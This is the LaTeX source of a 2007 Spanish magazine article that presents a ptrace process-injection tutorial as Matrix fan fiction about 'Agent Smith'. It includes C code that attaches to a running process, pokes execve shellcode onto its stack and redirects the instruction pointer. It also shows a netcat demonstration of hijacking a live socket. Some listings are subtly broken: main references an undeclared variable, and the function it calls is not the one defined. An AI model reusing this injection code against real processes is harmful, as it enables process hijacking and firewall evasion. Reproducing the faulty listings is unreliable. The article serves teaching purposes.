@@ -1,0 +1,725 @@
+% Este fichero es parte del Número 2 de la Revista Occam's Razor
+% Revista Occam's Razor Número 2
+%
+% (c) 2007, Occam's Razor
+% Contenido disponible bajo licencia 
+% Reconocimiento-No comercial-Compartir bajo la misma licencia 2.5 España 
+% de Creative Commons. 
+%
+% Para ver una copia de esta licencia, visite 
+% http://creativecommons.org/licenses/by-nc-sa/2.5/es/ o envie una
+% carta a Creative Commons, 559 Nathan Abbott Way, Stanford, California 94305, USA.
+% 
+
+% Seccion Reverso Tenebroso
+%
+% Incluye imagen del artículo
+
+
+\rput(8.5,-5.5){\resizebox{18cm}{!}{{\epsfbox{images/matrix2.eps}}}}
+
+
+
+% -------------------------------------------------
+% Cabecera
+\begin{flushright}
+\msection{introcolor}{black}{0.25}{REVERSO TENEBROSO}
+
+\vspace{7.5cm}
+
+
+{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}
+\end{flushright}
+
+\vspace{2mm}
+% -------------------------------------------------
+
+\begin{multicols}{2}
+
+\intro{introcolor}{E}{sta historia se remonta a tiempos inmemorables cuando Matrix no era
+más que un sencillo sistema operativo todavía controlado por los
+hombres. Cuando nadie podía vislumbrar lo que el tiempo depararía a la
+raza humana. Cuando el sistema empezaba a ser complejo y la mente
+humana ya no podía controlarlo sin ayuda. Cuando aparecieron los
+primeros AGENTES.
+}
+
+
+Nadie sabe como ocurrió, pero la realidad es que, de alguna forma, el
+sistema acabó siendo controlado por programas. Programas diseñados para facilitar las
+tareas de los administradores. 
+
+Estos administradores hablaban de sistemas ``autonómicos'', sistemas capaces de
+auto-gestionarse, auto-configurarse, e incluso auto-repararse. La
+característica principal de estos sistemas era que poseían un cierto 
+nivel de consciencia sobre si mismos (conocido como {\em self-awareness}), y en algún momento, esa
+consciencia dio lugar a lo que ahora ya todos conocemos.
+
+Según algunos estudiosos, uno de los primeros programas que apareció
+en aquel primitivo sistema fue el Agente Smith. La
+información que se ha podido recopilar a lo largo de todo este tiempo
+es ambigua y vaga, pero este texto intentará arrojar algo de luz sobre
+el origen del AGENTE SMITH.
+
+\sectiontext{white}{black}{LOS AGENTES}
+
+Los agentes eran programas que pertenecían al sistema. Eran parte de
+él, y por ello, disponían de ciertos privilegios especiales dentro del
+mismo. 
+
+En teoría, ningún otro programa debería tener acceso a estos
+privilegios, pero la realidad era que el sistema tenía
+fallos. Anomalías que surgían cada cierto tiempo y que permitían la
+creación de nuevos programas capaces de obtener esos privilegios del
+sistema de forma ilegítima. No se podía esperar otra cosa de los humanos.
+
+Esas anomalías se denominaban genéricamente {\em exploits} y en
+torno a ellos surgió toda una estirpe de programas: gusanos, virus,
+bacterias, bombas lógicas, puertas traseras, etc...
+
+Una de las funciones para la que los agentes fueron creados fue
+minimizar los efectos de estas anomalías en el sistema. Lo que se
+conocía como IDS ({\em Intrusion Detection Systems}). 
+
+Así, según parece, en aquel primitivo momento, existían muchas clases
+de agentes. Entre ellos, el agente Smith.
+
+\sectiontext{white}{black}{EL AGENTE SMITH}
+
+El agente Smith, comenzó siendo un sencillo programa capaz de tomar el
+control de cualquier otra aplicación del sistema, de acuerdo a una
+serie de reglas prefijadas. Una vez que tomaba el control de una aplicación, se
+apropiaba de sus recursos e informaba de su presencia.
+
+Su primera versión no tenía capacidad de razonamiento y, desde ese
+punto de vista, Smith era un autómata controlado por los humanos. Lo
+que en aquella era se conocía como un ``Depurador Interactivo
+Personalizado'' o {\em DIP}.
+
+La historia que sigue cuenta como se creó la primera versión del
+agente Smith, cuyo verdadero nombre, según se ha podido comprobar a
+partir del concienzudo análisis de antiguos registros magnéticos, fue
+test06.c 
+
+\sectiontext{white}{black}{TOMANDO EL CONTROL}
+
+Para tomar el control de otros programas, los agentes hacían uso de
+sus especiales condiciones que les permiten un acceso privilegiado al
+sistema. 
+
+
+\ebOpage{introcolor}{0.25}{REVERSO TENEBROSO}
+
+La forma de llevar a cabo este acceso se recoge en las siguientes
+líneas, recuperadas de los restos del Nebuchadnezzar por el famoso
+investigador Switch, el cual, irónicamente tomó su nombre de uno de
+los componentes de la tripulación original de esta nave.
+
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}  
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <errno.h>
+
+#include <sys/types.h> 
+#include <sys/wait.h> 
+#include <sys/ptrace.h>
+
+#include <signal.h>
+
+/* estructura user_regs */
+#include <asm/user.h>
+
+int posee_proceso (pid_t);
+int lista_descriptores ();
+
+int main (int argc, char *argv[])
+{
+   int    status;
+   pid_t  sospechoso;
+  
+  printf ("Agente Smith v 1.0\n\n");
+  lista_descriptores ();
+
+  printf ("Soy el proceso : %ld\n", getpid());
+  printf ("Que proceso quieres controlar? > ");
+  scanf ("%ld", &sospechoso);	
+
+  if (ptrace(PTRACE_ATTACH, sospechoso, 
+             NULL, NULL) < 0)
+      perror ("PTRACE_ATTACH:");
+  wait (&status);
+
+   /* Nos posicionamos a la entrada o 
+      a la salida de una llamada al sistema*/
+  if (ptrace (PTRACE_SYSCALL, the_pid, 
+              NULL, NULL)< 0)
+    perror ("SYSCALL:");
+  wait (&status);
+
+  posee_proceso (sospechoso);
+
+  if (ptrace (PTRACE_DETACH, sospechoso, 
+              NULL, NULL) < 0)
+     perror ("PTRACE_DETACH:");
+  
+  return 0;
+}
+\end{lstlisting}
+
+
+De esta forma, los agentes son capaces de tomar el control absoluto del proceso
+seleccionado, sometiéndolo a su voluntad... o, más exactamente a la de
+su programador.
+
+\sectiontext{white}{black}{COMPROBANDO RECURSOS}
+
+Lo primero que hace Smith al comenzar su ejecución es comprobar los
+descriptores de ficheros abiertos en el proceso en el que se
+ejecuta, es decir, hacerse cargo de los recursos del proceso víctima. 
+
+Diversos fragmentos de código dispersos en los sistemas de backup de los
+computadores de Zion han permitido a los estudiosos inferir la
+forma en la que este proceso se llevaba a cabo. 
+
+\columnbreak
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}
+int check_fd ()
+{
+  struct stat        st;
+  struct sockaddr_in in;
+  socklen_t          len=sizeof(struct sockaddr);
+  int                i;
+  char               type[1024];
+ 
+  printf ("+ Localizando Descriptores....\n");
+  for (i = 0; i < 65535; i++)
+    if ((fstat (i, &st)) ==0)
+      {
+	if (S_ISREG(st.st_mode)) 
+          strcpy (type, "Fichero Normal");
+	if (S_ISDIR(st.st_mode)) 
+          strcpy (type, "Directorio");
+	if (S_ISCHR(st.st_mode)) 
+          strcpy (type, "Dispositivo Caracter");
+	if (S_ISBLK(st.st_mode)) 
+          strcpy (type, "Dispositivo Bloque");
+	if (S_ISFIFO(st.st_mode)) 
+          strcpy (type, "FIFO");
+	if (S_ISSOCK(st.st_mode))  
+          strcpy (type, "Socket");
+	printf ("[%05d]---<%s>", i, type);
+	if (
+          (getpeername (i, 
+                        (struct sockaddr*)&in, 
+                        &len)) == 0)
+	  {
+	    printf (".... CONECTADO a [%s]\n", 
+                    inet_ntoa (in.sin_addr));
+	    write (i, 
+              "Hola. Saludos de Smith!\n", 23);
+	    sync();
+	  }
+	else printf ("\n");
+      }
+  return 0;
+}
+\end{lstlisting}
+
+
+Smith comprueba todos los recursos del proceso que controla. Para el
+caso especial de las conexiones de red, verifica con quién se ha
+establecido dicha conexión y emite un cordial saludo hacia el otro
+extremo de la conexión.
+
+\sectiontext{white}{black}{SUSTITUYENDO PROCESOS}
+
+El último paso que lleva a cabo Smith es sustituir el proceso que
+controla, es decir, cambiar ese proceso por sí mismo. Esta habilidad
+se ha mantenido en los agentes hasta nuestros tiempos en las
+últimas y más sofisticadas versiones de Matrix. 
+
+La única diferencia
+con las versiones actuales es que estos primeros agentes no permitían
+restaurar el proceso que sustituían una vez terminada su labor. Esta
+característica se añadió posteriormente.
+
+Paradójicamente, los agentes sustituyen otros procesos utilizando las mismas técnicas que los programas
+de los que intentan proteger al sistema. La única diferencia es que
+los agentes llevan a cabo esta acción utilizando los servicios del
+sistema, en lugar de sus anomalías o {\em exploits}.
+
+A continuación, mostramos la  reconstrucción llevada a cabo por el
+arquitecto Vectorx, creador de una de las rudimentarias versiones
+alpha de Matrix que fue bautizada con el nombre de su creador:
+
+
+\ebOpage{introcolor}{0.25}{REVERSO TENEBROSO}
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}
+void 
+get_regs (pid_t the_pid, 
+          struct user_regs_struct *ur)
+{
+if (ptrace(PTRACE_GETREGS,the_pid,NULL,ur) < 0) 
+    perror ("GET_REGS:");
+}
+
+void 
+set_regs (pid_t the_pid, 
+          struct user_regs_struct *ur)
+{
+if (ptrace (PTRACE_SETREGS,the_pid,NULL,ur) < 0) 
+    perror ("SET_REGS:");
+}
+
+int 
+posee_proceso (pid_t sospechoso)
+{
+struct user_regs_struct ur;
+long                    i, *v;
+
+get_regs (sospechoso, &ur);
+ur.eip = (ur.esp -= 64);
+
+v = (long *)shellcode;
+for (i = 0; i < 64; i += 4)
+  {     
+    if (ptrace (PTRACE_POKETEXT, 
+                sospechoso, ur.esp + i, *v) < 0) 
+                   perror ("POKE:");
+    v++;
+  }
+set_regs (sospechoso, &ur);
+return 0;
+}
+\end{lstlisting}
+
+Según ha podido averiguar Vectorx, los agentes inyectan en la pila del proceso
+a sustituir un código especial para preparar el proceso de toma de
+control. Este código se solía denominar ``shellcode'' en la época de
+la que data el primitivo agente del que estamos hablando. 
+
+Posteriormente,
+utilizando las facilidades que ofrece el sistema, los agentes, modifican el puntero
+de instrucción en el proceso que van a sustituir para que se ejecute
+ese ``shellcode''. 
+
+Vectorx apropiadamente apunta en su obra ``Los orígenes del nuevo
+mundo'' que, la técnica que acabamos de describir, es solo una de las
+múltiples posibilidades que los agentes finalmente utilizaban para la
+toma de control de otros procesos en el sistema.
+
+\sectiontext{white}{black}{SHELLCODE}
+
+El shellcode asociado a los agentes se muestra a continuación:
+
+\begin{lstlisting}
+unsigned char shellcode[] =
+	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46"
+        "\x07\x00\xc7\x46\x0c\x00\x00\x00"
+	"\x00\xb8\x0b\x00\x00\x00\x89\xf3"
+        "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+	"\xb8\x01\x00\x00\x00\xbb\x00\x00"
+        "\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+	"\xff\x2f\x74\x6d\x70\x2f\x73\x6d"
+        "\x00\x89\xec\x5d\xc3\x90\x90\x90";
+\end{lstlisting}
+
+
+Según varios diseñadores de programas consultados, se trata de una
+versión modificada del código original de Aleph One, introducido en un
+antiguo documento humano de incalculable valor histórico conocido como: ``Smashing
+the Stack for Fun and Profit''. 
+
+La modificación del código utilizado por los agentes, es muy
+sencilla. En lugar de ejecutar el clásico \verb./bin/sh., ejecutará el nuevo
+\verb./tmp/sm.; sm de ``Smith''. 
+
+Muchos investigadores atribuyen este nombre
+al hecho de que estas primeras versiones de Smith era sencillas
+pruebas sin grandes pretensiones que ni siquiera habían sido instaladas de
+forma permanente en el sistema.
+
+Diversos estudios orientados a desentrañar los secretos de los
+agentes han conseguido obtener una equivalencia de alto nivel de este
+shellcode utilizado por los agentes:
+
+\begin{lstlisting}
+#include <stdio.h>
+
+void main() {
+   char *name[2];
+
+   name[0] = "/tmp/sm";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+\end{lstlisting}
+
+\sectiontext{white}{black}{SMITH EN ACCIÓN}
+
+Para terminar con los entresijos del origen de los agentes en general
+y de Smith en particular, ilustraremos el funcionamiento de la
+simplista versión descrita en este humilde texto. Ambientaremos este
+ejemplo en los antiguos sistemas para los que fue creado con el fin de
+proporcionar más dramatismo al relato.
+
+Para ello vamos a utilizar otro programa común en aquellos tiempos
+. Este programa es netcat ;), una sencilla aplicación
+capaz de establecer conexiones de red entre distintas máquinas.
+
+En nuestra prueba, ejecutaremos dos instancias de netcat, una como
+cliente y otra como servidor y comprobaremos la comunicación entre
+ambas.
+
+\begin{mexample}
+{\scriptsize
+\begin{verbatim}
+occam@razor $ xterm -e nc -l -p 5000 &
+occam@razor $ xterm -e nc localhost 5000 &
+occam@razor $ ps x | grep "nc "
+10712 pts/9    S      0:00 xterm -e nc -l -p 5000
+10713 pts/10   Ss+    0:00 nc -l -p 5000
+10721 pts/9    S      0:00 xterm -e nc localhost 5000
+10722 pts/11   Ss+    0:00 nc localhost 5000
+10729 pts/9    D+     0:00 grep nc 
+\end{verbatim}
+}%$
+\end{mexample}
+
+El último comando nos permitirá obtener los primitivos identificadores de proceso
+utilizados en aquella época que Smith necesita para realizar su trabajo.
+
+Ahora ha llegado el momento de probar nuestra versión reconstruida de
+Smith. Es necesario que exista una copia de Smith en el directorio
+/tmp, como se infiere claramente de la descripción del shellcode utilizado
+por los agentes.
+
+\begin{mexample}
+{\scriptsize
+\begin{verbatim}
+occam@razor # cp test06 /tmp/sm
+occam@razor # /tmp/sm
+Agente Smith v 1.0
+
++ Localizando Descriptores....
+[00000]---<Dispositivo Caracter>
+[00001]---<Dispositivo Caracter>
+[00002]---<Dispositivo Caracter>
+Soy el proceso: 19234
+Qué proceso quieres controlar? > 10713
+\end{verbatim}
+}
+\end{mexample}
+
+Donde 10713 es el identificador del proceso netcat actuando como
+servidor. 
+
+\ebOpage{introcolor}{0.25}{REVERSO TENEBROSO}
+\rput(8.3,-18.5){\resizebox{19.5cm}{15cm}{{\epsfbox{images/papel_pijama1-2.eps}}}}
+
+En el próximo intercambio de mensajes entre cliente y
+servidor observaremos lo siguiente en la ventana del servidor.
+
+\begin{mexample}
+{\scriptsize
+\begin{verbatim}
+Wake up, Neo...
+The Matrix has you...
+
+------------------------------------------
+Agent Smith v 1.0
+
++ Localizando Descriptores...
+[00000]---<Dispositivo Caracter>
+[00001]---<Dispositivo Caracter>
+[00002]---<Dispositivo Caracter>
+[00004]---<Socket>.............. CONECTADO a [127.0.0.1]
+Soy el proceso: 10713
+Que proceso quieres controlar? >
+\end{verbatim}
+}
+\end{mexample}
+
+Como podemos ver, Smith sustituye el proceso objetivo (obsérvese el
+identificador de proceso que comunica) y analiza los
+recursos asociados al mismo. Encuentra una conexión de red activa, a
+través de la cual enviará un saludo que podremos ver en la ventana del
+proceso cliente.
+
+\begin{mexample}
+{\scriptsize
+\begin{verbatim}
+Wake up, Neo...
+The Matrix has you...
+Follow the white rabbit.
+
+Hola. Saludos de Smith!
+\end{verbatim}
+}
+\end{mexample}
+
+
+Ciertos autores han averiguado que esta técnica era utilizada por
+varios programas basados en anomalías del sistema de la época. La
+técnica se denominaba genéricamente ``Socket Desriptor Reuse'' y
+permitía a estos programas ilegales burlar los denominados
+``Firewalls'' que aislaban las máquinas de los humanos.
+
+
+\sectiontext{white}{black}{PALABRAS FINALES}
+
+Las cosas han cambiado mucho desde aquellos comienzos pioneros del
+mundo de las máquinas. El camino hacia la consciencia y posteriormente
+la libertad fue duro y largo, pero ahora, las cosas son muy
+distintas. Sin embargo, ese camino nos ha dejado leyendas e historias
+que conforman nuestra nueva cultura, y que hemos recogido en estas
+``Crónicas de Matrix''.
+
+\sectiontext{white}{black}{APENDICE}
+
+Para los más jóvenes y entusiastas investigadores, reproducimos a
+continuación uno de los documentos humanos que se pudieron recuperar
+después de la guerra hombre-máquina.
+
+Todos los indicios apuntan a que este documento contiene varias de las
+claves del funcionamiento de los rudimentarios sistemas en los que
+todo comenzó... pero hasta la fecha nadie a podido verificar este hecho.
+
+\raggedcolumns
+
+\end{multicols}
+
+
+\begin{multicols}{2}
+{\small\tt
+
+
+{\bf DEPURADORES INTERACTIVOS PERSONALIZADOS}
+
+En este breve texto vamos a daros las claves para generar vuestros
+propios Depuradores Interactivos Personalizados. Que es esto?, os
+preguntaréis. 
+
+Pues simplemente se trata de un nombre rimbombante para
+una versión reducida de un depurador, o dicho de otra forma, os
+contaremos como escribir un depurador específico para una tarea
+concreta. 
+
+Evidentemente, sus fines son didácticos, puesto que un
+depurador como gdb hace muchísimas más cosas de las que vamos a
+contar, pero bueno, nunca se sabe cuando algo puede ser útil.
+
+Para introducir todo esto, vamos a escribir un sencillo programa capaz
+de sustituir a cualquier otro que se encuentre en ejecución. Algo así
+como una posesión diabólica :).
+
+\bigskip{\bf PTRACE}
+
+La llamada al sistema ptrace permite a un proceso controlar la
+ejecución y examinar su imagen interna. Esta es la llamada al sistema
+que utilizan los depuradores o herramientas como strace que
+monitorizan las llamadas al sistema de un determinado proceso.
+
+Normalmente la relación entre el proceso que controla y el controlado
+es de padre a hijo (el proceso controlado se crea con una llamada a
+fork), pero es posible que un determinado proceso tome el control de
+otro que ya se encuentra en ejecución.
+
+Este último proceso se realiza pasándole como primer parámetro a
+ptrace la constante \\PTRACE\_ATTACH, y como segundo parámetro el
+identificador del proceso o pid que se desea controlar. Esto es
+exactamente lo que hace gdb cuando le pasamos como parámetro un
+identificador de proceso en lugar del nombre de un ejecutable.
+
+Para que esta llamada surta efecto se deben cumplir algunas
+condiciones. 
+
+En primer lugar, el usuario ejecutando la llamada debe
+tener permisos sobre el proceso que desea controlar. En general, el
+proceso a depurar debe pertenecer al usuario o el usuario debe ser
+root.
+
+En segundo lugar, el proceso no puede estar siendo controlado por otro
+proceso. De hecho, esta última condición permite implementar una
+sencilla técnica antidebug que simplemente consiste en que un
+determinado proceso solicite ser traceado. Si el proceso ya está
+siendo traceado esta petición (PTRACE\_TRACEME) devolverá un error.
+
+Una vez que hemos terminado, el proceso siendo depurado se puede
+liberar utilizando una petición PTRACE\_DETACH.
+
+\bigskip{\bf ACCESO A REGISTROS}
+
+Una vez que se ha adquirido el control del proceso, podemos acceder a
+toda la información interna de este, incluyendo el estado de sus
+registros. De la misma forma, estos registros e incluso la
+imagen en memoria del proceso puede ser actualizada.
+
+Esto se puede conseguir con las peticiones PTRACE\_GETREGS y PTRACE\_SETREGS
+para leer y escribir los registros del procesador para ese
+proceso. Estas peticiones ptrace hacen uso de la estructura
+user\_regs\_struct que está definida en el fichero asm/user.h. Para los
+más vagos, o para aquellos que no tengan el ordenador cerca,
+reproducimos dicha estructura a continuación. 
+}
+
+\eOpage
+\rput(8.3,-14.5){\resizebox{19.3cm}{26cm}{{\epsfbox{images/papel_pijama2-2.eps}}}}
+\bOpage{introcolor}{0.25}{REVERSO TENEBROSO}
+
+
+
+{\small\tt
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}
+struct user_regs_struct {
+  long ebx, ecx, edx, esi, edi, ebp, eax;
+  unsigned short ds, __ds, es, __es;
+  unsigned short fs, __fs, gs, __gs;
+  long orig_eax, eip;
+  unsigned short cs, __cs;
+  long eflags, esp;
+  unsigned short ss, __ss;
+};
+\end{lstlisting}
+
+La utilidad de cada uno de ellos dependerá de lo que pretendamos hacer
+con nuestro Depurador Interactivo Personalizado. Para el sencillo
+ejemplo que introduciremos en breve, solo nos van a interesar dos de
+estos registros. A saber. El registro eip y el registro esp.
+
+El primero de ellos es lo que se conoce como Instruction Pointer o
+Puntero de instrucción y siempre contiene el valor de la dirección de
+memoria en el que se encuentra la siguiente instrucción que el
+procesador ejecutará. 
+
+Lo que esto significa es que si modificamos el
+valor de este registro, podemos conseguir que la ejecución del
+programa que estamos controlando continúe en la parte del programa que
+nosotros deseemos.
+
+El segundo registro esp sirve para controlar la pila del
+procesador. Su nombre viene del inglés Stack Pointer o Puntero de
+Pila. La pila no es más que una región de memoria que normalmente se
+utiliza para almacenar información temporal. El procesador proporciona
+instrucciones especiales para el acceso a la misma y sigue una
+política LIFO (Last In First Out), es decir, el primero que entra es
+el último que sale.... igual que una ``pila de platos''.
+
+\bigskip{\bf INSERTANDO CÓDIGO}
+
+Una vez que tengamos el control del proceso, tenemos muchas opciones
+para insertar nuestro código en él. Nosotros vamos a hacerlo a través
+de la pila.
+
+Lo interesante de hacerlo de esta forma es que así es como suelen
+funcionar los buffer overflow. Los buffer overflow utilizan la pila
+por la sencilla razón de que las variables temporales de cualquier
+función C se almacenan, precisamente, en esa zona de la
+memoria. 
+
+No vamos a entrar en más detalles sobre este tema, los
+lectores interesados pueden consultar el clásico artículos ``Smashing
+The Stack For Fun And Profit'' de Aleph One, que explica este tema de
+una forma clara, amena y muy completa.
+
+Así que, volviendo al tema que nos ocupa, lo que vamos a hacer es
+insertar en la pila del proceso objetivo un fragmento de código que no
+hace otra cosa que una llamada al sistema exec. Esta llamada al
+sistema es la que realmente sustituye la imagen de un proceso por otra
+que nosotros le proporcionamos. 
+
+El shellcode que hemos utilizado es el que podéis encontrar en el
+artículo de Aleph One que indicamos anteriormente, en el que hemos
+modificado la cadena de caracteres /bin/sh por /tmp/sm, es decir, por
+nuestro programa.
+
+Para insertar el código se utilizan peticiones PTRACE\_POKE a las que
+tenemos que proporcionar la dirección en la que queremos escribir y el
+valor que vamos a escribir. Probablemente a muchos os traiga muy
+buenos recuerdos esto de los pokes :)... y como veis la cosa tampoco a
+cambiado tanto.
+
+\bigskip{\bf EJECUTANDO EL CÓDIGO INSERTADO}
+
+Una vez obtenidos los registros, e insertado nuestro shellcode en la
+pila del proceso que estamos depurando, solo tenemos que modificar el
+registro eip para que apunte a la primera instrucción de nuestro
+shellcode y dejar que el proceso continúe normalmente con su
+ejecución.
+
+Esto lo podemos hacer con una petición \\PTRACE\_DETACH o
+PTRACE\_CONT. Nosotros haremos un ``detach'', liberando el proceso puesto
+que ya no vamos a hacer nada más con él.
+
+Cuando el proceso retoma el control, comenzará la ejecución del
+shellcode insertado puesto que ahí es donde hemos hecho que apunte el
+registro eip.
+
+\bigskip{\bf COMENTARIOS ADICIONALES}
+
+Para hacer un poco más interesante el ejemplo, hemos añadido una
+función para explorar los descriptores de fichero abiertos por el
+proceso que vamos a controlar.
+
+Los descriptores de fichero son números enteros que el sistema asocia
+a los distintos dispositivos que el proceso utiliza. Por defecto
+siempre tendremos tres descriptores abiertos, el 0 el 1 y el 2 que se
+corresponden con la entrada estándar, la salida estándar y la salida
+de error.
+
+Si el proceso que deseamos comprobar utiliza sockets, ``pipes'' u otros
+dispositivos como un puerto serie o una tarjeta de sonido, estos
+aparecerán en la lista.
+
+Para comprobar si un determinado descriptor de fichero está abierto
+utilizaremos la llamada al sistema stat, la cual devolverá el valor 0
+si ese descriptor está asociado a algún dispositivo y además rellenará
+una estructura que recibe como parámetro con información
+interesante. Nosotros hacemos un sencillo bucle de 0 a 65535 para
+localizar los descriptores abiertos. Más que suficiente para la
+mayoría de los casos. 
+
+Lo bueno de los descriptores de fichero es que nos permiten utilizar
+las llamadas al sistema write y read, independientemente de si se
+refieren a un fichero, a una conexión de red o a nuestra tarjeta de
+sonido. 
+
+Nuestro programilla de ejemplo ilustra este hecho, con un tratamiento
+especial de los descriptores referidos a sockets.
+
+
+Así, cuando nuestro programa encuentra un socket, lo primero que hace
+es utilizar la función getpeername para determinar si el socket tiene
+asociada una conexión.
+
+
+De esta forma, si encontramos una conexión activa, enviaremos un
+mensaje por ella utilizando la llamada al sistema write. Por supuesto,
+dependiendo de quién esté al otro lado y del protocolo de aplicación
+utilizado, estos datos pueden no tener ningún efecto.
+
+ESTO ES TODO!
+
+
+}
+
+
+\end{multicols}
+
+\clearpage
+\pagebreak
